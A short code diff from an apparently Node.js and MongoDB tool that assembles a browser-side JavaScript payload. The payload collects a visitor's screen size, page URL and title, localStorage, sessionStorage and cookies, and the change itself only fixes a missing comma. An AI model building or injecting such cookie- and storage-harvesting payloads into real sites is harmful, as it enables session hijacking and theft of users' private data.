@@ -983,7 +983,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				variables	+= 'j = k.screen, a = k.devicePixelRatio,'
 				json		+= 'e: j.height * a, f: j.width * a,'
 			}
-			if (location)		json		+= 'd: k.location.href, j: d.title'
+			if (location)		json		+= 'd: k.location.href, j: d.title,'
 			if (localStorage)	catcher		+= 'i.g = localStorage,'
 			if (sessionStorage)	catcher		+= 'i.h = sessionStorage,'
 			if (cookies)		json		+= 'i: d.cookie,'
